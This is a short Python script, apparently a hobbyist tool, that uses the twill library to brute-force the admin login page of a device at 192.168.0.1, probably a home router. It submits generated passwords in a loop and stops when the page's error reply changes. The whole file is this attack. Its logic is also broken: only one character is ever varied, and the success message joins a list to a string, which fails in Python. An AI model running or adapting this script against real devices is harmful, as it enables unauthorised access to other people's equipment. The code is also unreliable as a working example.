#!/usr/bin/python

from twill.commands import *
from sys import stdout

#To count the number of characters
count = 0

#The test string
ch = ['a', 'a', 'a', 'a', 'a']

#The length of the current test string
length = len(ch)

while True :

    #Logic to change the test password
    ch[3] = chr(ord(ch[3])+1)               #Changes only one.. improve it

    #Convert the list to string
    c = ''.join(ch)

    #Logic to insert password
    go("http://192.168.0.1/login.htm")
    fv("1", "password", c)
    submit()
    res = show()
    if res != '<html><head><meta HTTP-EQUIV="Pragma" CONTENT="no-cache"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script language=\'javascript\'>alert("Username or password error, try again!");</script></head><body onload="window.location.href=\'login.htm\';"></body></html>' :
        print (ch + " is the found password.")
        break
